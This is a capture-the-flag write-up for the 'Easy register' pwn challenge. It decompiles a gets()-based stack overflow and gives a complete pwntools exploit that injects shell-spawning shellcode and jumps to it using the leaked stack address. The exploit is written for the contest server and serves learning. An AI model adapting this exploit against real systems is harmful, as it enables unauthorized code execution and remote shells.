# Easy register

```
score: 275
solved: xx/101
difficulty: easy
tags: pwn, shellcode, bof
```

## Problem
```
Registers are easy!

Connect at easyregister.ctf.intigriti.io 7777
Download link: easy_register
Flag format: 1337UP{}
Created by Sebastian Stohr
```
Attached: [easy_regiser](https://downloads.ctf.intigriti.io/1337UPLIVECTF2022-894ff411-aff8-453c-87b1-20ea939a7b6c/easyregister/eb97ef6b-df53-4c3c-bfbf-9c6d436b04d2/easy_register)

## Got the flag
Download and open with `ghidra`, I have pseudocode:
```c
void easy_register(void)

{
  char local_58 [80];
  
  printf("[\x1b[34mi\x1b[0m] Initialized attendee listing at %p.\n",local_58);
  puts("[\x1b[34mi\x1b[0m] Starting registration application.\n");
  printf("Hacker name > ");
  gets(local_58);
  puts("\n[\x1b[32m+\x1b[0m] Registration completed. Enjoy!");
  puts("[\x1b[32m+\x1b[0m] Exiting.");
  return;
}
```
and `checksec` result
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
```
Easy to get BOF vulnerability at `gets` function.\
The strategy is inject a shell and override return address by our shell to trigger. \
If you know the way to use `pwntools`, you will have easy solver:
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./easy_register_patched")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.DG:
        r = process([exe.path])
        gdb.attach(r, gdbscript = '''
        init-gef\n
        b main\n
        b easy_register\n
        b *0x000127c\n
            ''')
    else:
        r = remote("easyregister.ctf.intigriti.io", 7777)

    return r


def main():
    size = 80
    r = conn()
    
    # get stack address:
    r.recvuntil(b"attendee listing at ")
    add = r.recvuntil(b".\n")[2:-2]
    add = int(add,16)
    log.info(hex(add))

    # insert a shell:
    shellcode = shellcraft.sh()
    payload =b""
    payload += asm(shellcode)
    payload = payload.ljust(size,b"\x01")
    payload += p64(0) # fake ebp
    payload += p64(add) # return to shell
    payload += b"\n"

    r.sendafter(b"Hacker name > ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
```